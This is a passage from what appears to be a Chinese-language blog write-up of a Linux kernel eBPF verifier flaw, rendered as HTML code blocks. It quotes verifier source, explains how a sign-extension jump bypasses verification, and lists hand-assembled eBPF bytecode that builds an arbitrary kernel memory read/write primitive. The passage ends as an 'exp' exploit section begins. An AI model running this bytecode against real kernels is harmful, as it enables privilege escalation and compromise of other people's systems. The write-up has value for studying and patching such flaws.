class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (is_pointer_value(env, BPF_REG_0)) &#123;</span><br><span class="line">    verbose(<span class="string">&quot;R0 leaks addr as return value\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> -EACCES;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  process_bpf_exit:</span><br><span class="line">  insn_idx = pop_stack(env, &amp;prev_insn_idx);</span><br><span class="line">  <span class="keyword">if</span> (insn_idx &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    do_print_state = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">pop_stack</span><span class="params">(struct verifier_env *env, <span class="keyword">int</span> *prev_insn_idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">verifier_stack_elem</span> *<span class="title">elem</span>;</span></span><br><span class="line">	<span class="keyword">int</span> insn_idx;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (env-&gt;head == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memcpy</span>(&amp;env-&gt;cur_state, &amp;env-&gt;head-&gt;st, <span class="keyword">sizeof</span>(env-&gt;cur_state));</span><br><span class="line">	insn_idx = env-&gt;head-&gt;insn_idx;</span><br><span class="line">	<span class="keyword">if</span> (prev_insn_idx)</span><br><span class="line">		*prev_insn_idx = env-&gt;head-&gt;prev_insn_idx;</span><br><span class="line">	elem = env-&gt;head-&gt;next;</span><br><span class="line">	kfree(env-&gt;head);</span><br><span class="line">	env-&gt;head = elem;</span><br><span class="line">	env-&gt;stack_size--;</span><br><span class="line">	<span class="keyword">return</span> insn_idx;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">verifier_env</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_prog</span> *<span class="title">prog</span>;</span>		<span class="comment">/* eBPF program being verified */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">verifier_stack_elem</span> *<span class="title">head</span>;</span> <span class="comment">/* stack of verifier states to be processed */</span></span><br><span class="line">	<span class="keyword">int</span> stack_size;			<span class="comment">/* number of states to be processed */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">verifier_state</span> <span class="title">cur_state</span>;</span> <span class="comment">/* current verifier state */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">verifier_state_list</span> **<span class="title">explored_states</span>;</span> <span class="comment">/* search pruning optimization */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">used_maps</span>[<span class="title">MAX_USED_MAPS</span>];</span> <span class="comment">/* array of map&#x27;s used by eBPF program */</span></span><br><span class="line">	u32 used_map_cnt;		<span class="comment">/* number of used maps */</span></span><br><span class="line">	<span class="keyword">bool</span> allow_ptr_leaks;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>所以我们在实现构造时需要将head位置为0，根据函数名<code>pop_stack</code>可以推测出来这里其实也就是栈的操作，所以大致的构造方法是：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BPF_MOV32_IMM(BPF_REG_9, <span class="number">0xFFFFFFFF</span>),             <span class="comment">/* r9 = (u32)0xFFFFFFFF   */</span></span><br><span class="line">BPF_JMP_IMM(BPF_JNE, BPF_REG_9, <span class="number">0xFFFFFFFF</span>, <span class="number">2</span>),   <span class="comment">/* if (r9 == -1) &#123;        */</span></span><br><span class="line">BPF_MOV64_IMM(BPF_REG_0, <span class="number">0</span>),                      <span class="comment">/*   exit(0);             */</span></span><br><span class="line">BPF_EXIT_INSN(),</span><br><span class="line">option,</span><br><span class="line">pandding == <span class="number">0</span>,</span><br><span class="line">options</span><br></pre></td></tr></table></figure>

<h3 id="实现任意地址读写"><a href="#实现任意地址读写" class="headerlink" title="实现任意地址读写"></a>实现任意地址读写</h3><p>内存读写需要用到的指令主要是BPF_LDX_MEM或者BPF_STX_MEM两类。如下，当r7和r8的值可控就可以达到内存任意写，类似于mov dword ptr[r7],r8这样的操作。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (class == BPF_LDX) &#123;</span><br><span class="line">  <span class="keyword">enum</span> bpf_reg_type src_reg_type;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* check for reserved fields is already done */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* check src operand */</span></span><br><span class="line">  err = check_reg_arg(regs, insn-&gt;src_reg, SRC_OP);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">  err = check_reg_arg(regs, insn-&gt;dst_reg, DST_OP_NO_MARK);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">  src_reg_type = regs[insn-&gt;src_reg].type;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* check that memory (src_reg + off) is readable,</span></span><br><span class="line"><span class="comment">			 * the state of dst_reg will be updated by this func</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">  err = check_mem_access(env, insn-&gt;src_reg, insn-&gt;off,</span><br><span class="line">                         BPF_SIZE(insn-&gt;code), BPF_READ,</span><br><span class="line">                         insn-&gt;dst_reg);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (BPF_SIZE(insn-&gt;code) != BPF_W) &#123;</span><br><span class="line">    insn_idx++;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (insn-&gt;imm == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">/* saw a valid insn</span></span><br><span class="line"><span class="comment">				 * dst_reg = *(u32 *)(src_reg + off)</span></span><br><span class="line"><span class="comment">				 * use reserved &#x27;imm&#x27; field to mark this insn</span></span><br><span class="line"><span class="comment">				 */</span></span><br><span class="line">    insn-&gt;imm = src_reg_type;</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (src_reg_type != insn-&gt;imm &amp;&amp;</span><br><span class="line">             (src_reg_type == PTR_TO_CTX ||</span><br><span class="line">              insn-&gt;imm == PTR_TO_CTX)) &#123;</span><br><span class="line">    <span class="comment">/* ABuser program is trying to use the same insn</span></span><br><span class="line"><span class="comment">				 * dst_reg = *(u32*) (src_reg + off)</span></span><br><span class="line"><span class="comment">				 * with different pointer types:</span></span><br><span class="line"><span class="comment">				 * src_reg == ctx in one branch and</span></span><br><span class="line"><span class="comment">				 * src_reg == stack|map in some other branch.</span></span><br><span class="line"><span class="comment">				 * Reject it.</span></span><br><span class="line"><span class="comment">				 */</span></span><br><span class="line">    verbose(<span class="string">&quot;same insn cannot be used with different pointers\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (class == BPF_STX) &#123;</span><br><span class="line">  <span class="keyword">enum</span> bpf_reg_type dst_reg_type;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (BPF_MODE(insn-&gt;code) == BPF_XADD) &#123;</span><br><span class="line">    err = check_xadd(env, insn);</span><br><span class="line">    <span class="keyword">if</span> (err)</span><br><span class="line">      <span class="keyword">return</span> err;</span><br><span class="line">    insn_idx++;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* check src1 operand */</span></span><br><span class="line">  err = check_reg_arg(regs, insn-&gt;src_reg, SRC_OP);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line">  <span class="comment">/* check src2 operand */</span></span><br><span class="line">  err = check_reg_arg(regs, insn-&gt;dst_reg, SRC_OP);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">  dst_reg_type = regs[insn-&gt;dst_reg].type;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* check that memory (dst_reg + off) is writeable */</span></span><br><span class="line">  err = check_mem_access(env, insn-&gt;dst_reg, insn-&gt;off,</span><br><span class="line">                         BPF_SIZE(insn-&gt;code), BPF_WRITE,</span><br><span class="line">                         insn-&gt;src_reg);</span><br><span class="line">  <span class="keyword">if</span> (err)</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (insn-&gt;imm == <span class="number">0</span>) &#123;</span><br><span class="line">    insn-&gt;imm = dst_reg_type;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (dst_reg_type != insn-&gt;imm &amp;&amp;</span><br><span class="line">             (dst_reg_type == PTR_TO_CTX ||</span><br><span class="line">              insn-&gt;imm == PTR_TO_CTX)) &#123;</span><br><span class="line">    verbose(<span class="string">&quot;same insn cannot be used with different pointers\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>check_mem_access</code>函数会根据读写类型检查dst或src的值是否为栈指针、数据包指针、map指针，否则不允许读写。所以这里使用BPF_FUNC_map_lookup_elem这样的函数调用返回，再赋给某个寄存器，然后再进行读写。</p>
<p>最终构造的eBPF指令为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">----------------------------------------------part <span class="number">1</span> ----------------------------------------------</span><br><span class="line"><span class="number">1.</span> <span class="string">&quot;\xb4\x09\x00\x00\xff\xff\xff\xff&quot;</span>  <span class="comment">/* BPF_MOV32_IMM(BPF_REG_9, 0xFFFFFFFF),              r9 = (u32)0xFFFFFFFF   */</span></span><br><span class="line"><span class="number">2.</span> <span class="string">&quot;\x55\x09\x02\x00\xff\xff\xff\xff&quot;</span>  <span class="comment">/*BPF_JMP_IMM(BPF_JNE, BPF_REG_9, 0xFFFFFFFF, 2),    if (r9 == -1) &#123;        */</span></span><br><span class="line"><span class="number">3.</span> <span class="string">&quot;\xb7\x00\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_MOV64_IMM(BPF_REG_0, 0),                         exit(0);             */</span></span><br><span class="line"><span class="number">4.</span> <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_EXIT_INSN()                                                            */</span></span><br><span class="line">----------------------------------------------part <span class="number">2</span> ----------------------------------------------</span><br><span class="line"><span class="number">5.</span> <span class="string">&quot;\x18\x19\x00\x00\x03\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_LD_MAP_FD(BPF_REG_9, mapfd),                 /* r9=mapfd               */</span></span><br><span class="line"><span class="number">6.</span> <span class="string">&quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">----------------------------------------------part <span class="number">3</span> ----------------------------------------------</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* BPF_MAP_GET(0, BPF_REG_6)  r6=op，取map中Key值为0的value值存放到reg_6</span></span><br><span class="line"><span class="comment">* */</span></span><br><span class="line"><span class="number">10.</span> <span class="string">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),              /* r1 = r9                */</span></span><br><span class="line"><span class="number">11.</span> <span class="string">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),             /* r2 = fp                */</span></span><br><span class="line"><span class="number">12.</span> <span class="string">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span>  <span class="comment">/*BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),            /* r2 = fp - 4            */</span></span><br><span class="line"><span class="number">13.</span> <span class="string">&quot;\x62\x0a\xfc\xff\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx=0),           /* *(u32 *)(fp - 4) = 0 */</span></span><br><span class="line"><span class="number">14.</span> <span class="string">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),           */</span></span><br><span class="line"><span class="number">15.</span> <span class="string">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),            /* if (r0 == 0)           */</span></span><br><span class="line"><span class="number">16.</span> <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_EXIT_INSN(),                                  /*   exit(0);             */</span></span><br><span class="line"><span class="number">17.</span> <span class="string">&quot;\x79\x06\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_LDX_MEM(BPF_DW, (r6), BPF_REG_0, 0)          /* r_dst = *(u64 *)(r0)   */</span></span><br><span class="line">----------------------------------------------part <span class="number">4</span> ----------------------------------------------</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* BPF_MAP_GET(1, BPF_REG_7)  r7=address,取map中Key值为1的value值存放到reg_7</span></span><br><span class="line"><span class="comment">* */</span></span><br><span class="line"><span class="number">21.</span> <span class="string">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),              /* r1 = r9                */</span></span><br><span class="line"><span class="number">22.</span> <span class="string">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),             /* r2 = fp                */</span></span><br><span class="line"><span class="number">23.</span> <span class="string">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span>  <span class="comment">/*BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),            /* r2 = fp - 4            */</span></span><br><span class="line"><span class="number">24.</span> <span class="string">&quot;\x62\x0a\xfc\xff\x01\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx=1),           /* *(u32 *)(fp - 4) = 1 */</span></span><br><span class="line"><span class="number">25.</span> <span class="string">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),          */</span></span><br><span class="line"><span class="number">26.</span> <span class="string">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),            /* if (r0 == 0)           */</span></span><br><span class="line"><span class="number">27.</span> <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_EXIT_INSN(),                                  /*   exit(0);             */</span></span><br><span class="line"><span class="number">28.</span> <span class="string">&quot;\x79\x07\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_LDX_MEM(BPF_DW, (r7), BPF_REG_0, 0)          /* r_dst = *(u64 *)(r0)   */</span></span><br><span class="line">----------------------------------------------part <span class="number">5</span> ----------------------------------------------</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* BPF_MAP_GET(2, BPF_REG_8)  r8=value，取map中Key值为2的value值存放到reg_8</span></span><br><span class="line"><span class="comment">* */</span></span><br><span class="line"><span class="number">32.</span> <span class="string">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_MOV64_REG(BPF_REG_1, BPF_REG_9),              /* r1 = r9                */</span></span><br><span class="line"><span class="number">33.</span> <span class="string">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),             /* r2 = fp                */</span></span><br><span class="line"><span class="number">34.</span> <span class="string">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span>  <span class="comment">/*BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),            /* r2 = fp - 4            */</span></span><br><span class="line"><span class="number">35.</span> <span class="string">&quot;\x62\x0a\xfc\xff\x02\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_ST_MEM(BPF_W, BPF_REG_10, -4, idx=2),           /* *(u32 *)(fp - 4) = 2 */</span></span><br><span class="line"><span class="number">36.</span> <span class="string">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span>  <span class="comment">//BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),</span></span><br><span class="line"><span class="number">37.</span> <span class="string">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),            /* if (r0 == 0)           */</span></span><br><span class="line"><span class="number">38.</span> <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_EXIT_INSN(),                                  /*   exit(0);             */</span></span><br><span class="line"><span class="number">39.</span> <span class="string">&quot;\x79\x08\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_LDX_MEM(BPF_DW, (r8), BPF_REG_0, 0)          /* r_dst = *(u64 *)(r0)   */</span></span><br><span class="line">----------------------------------------------part <span class="number">6</span> ----------------------------------------------</span><br><span class="line"><span class="number">1.</span> <span class="string">&quot;\xbf\x02\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_MOV64_REG(BPF_REG_2, BPF_REG_0),               /* r2 = r0    此时r2和r0都指向map中key=2的元素           */</span></span><br><span class="line"><span class="number">2.</span> <span class="string">&quot;\xb7\x00\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_MOV64_IMM(BPF_REG_0, 0),                       /* r0 = 0  for exit(0)   */</span></span><br><span class="line"><span class="number">3.</span> <span class="string">&quot;\x55\x06\x03\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_JMP_IMM(BPF_JNE, BPF_REG_6, 0, 3),             /* if (op == 0)          */</span></span><br><span class="line"><span class="number">4.</span> <span class="string">&quot;\x79\x73\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">//BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_7, 0), 读取BPF_REG_7地址的内容放到BPF_REG_3</span></span><br><span class="line"><span class="number">5.</span> <span class="string">&quot;\x7b\x32\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">//BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_3, 0),将BPF_REG_3的内容放入到BPF_REG_2</span></span><br><span class="line"><span class="number">6.</span> <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">//BPF_EXIT_INSN(),</span></span><br><span class="line"><span class="number">7.</span> <span class="string">&quot;\x55\x06\x02\x00\x01\x00\x00\x00&quot;</span>  <span class="comment">//BPF_JMP_IMM(BPF_JNE, BPF_REG_6, 1, 2),       if(op != 1 )JMP insn+2</span></span><br><span class="line"><span class="number">8.</span> <span class="string">&quot;\x7b\xa2\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">//BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_10, 0), when op == 1 将rbp寄存器的值即fp指针放到BPF_REG_2</span></span><br><span class="line"><span class="number">9.</span> <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">//BPF_EXIT_INSN(),                                  /*   exit(0);             */</span></span><br><span class="line"><span class="number">10.</span> <span class="string">&quot;\x7b\x87\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">//BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0), when op == 2 往BPF_REG_7的地址写入BPF_REG_8</span></span><br><span class="line"><span class="number">11.</span> <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">//BPF_EXIT_INSN(),</span></span><br></pre></td></tr></table></figure>

<h3 id="综上，exp"><a href="#综上，exp" class="headerlink" title="综上，exp"></a>综上，exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span 